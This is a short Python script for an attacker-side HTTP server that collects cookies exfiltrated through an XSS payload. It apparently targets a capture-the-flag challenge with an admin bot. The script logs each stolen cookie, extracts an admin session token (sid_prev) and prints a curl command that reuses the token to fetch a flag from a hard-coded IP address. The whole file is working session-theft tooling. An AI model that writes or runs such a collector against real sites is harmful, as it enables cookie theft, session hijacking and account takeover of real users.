#!/usr/bin/env python3
import http.server
import socketserver
import sys
from urllib.parse import urlparse, parse_qs

PORT = 8000
stolen_cookie = None

class CookieStealerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Custom logging
        pass
    
    def do_GET(self):
        global stolen_cookie
        
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        print(f"\n[+] Received request: {self.path}")
        
        if 'cookie' in params or 'c' in params:
            cookie_data = params.get('cookie', params.get('c', ['']))[0]
            print(f"[+] Stolen cookie: {cookie_data}")
            stolen_cookie = cookie_data
            
            # Extract sid_prev if present
            if 'sid_prev=' in cookie_data:
                sid_prev = [x.split('sid_prev=')[1].split(';')[0] for x in cookie_data.split() if 'sid_prev=' in x]
                if sid_prev:
                    print(f"\n[!] ADMIN SESSION STOLEN: {sid_prev[0]}")
                    print(f"\n[*] Get the flag with:")
                    print(f"    curl -b 'sid={sid_prev[0]}' http://34.26.148.28:5000/flag")
        
        # Send response
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'OK')

print(f"[*] Starting cookie stealer server on port {PORT}")
print(f"[*] Waiting for admin bot to visit...")
print(f"[*] Use this in your payload: http://YOUR_PUBLIC_IP:{PORT}/")

with socketserver.TCPServer(("", PORT), CookieStealerHandler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        sys.exit(0)
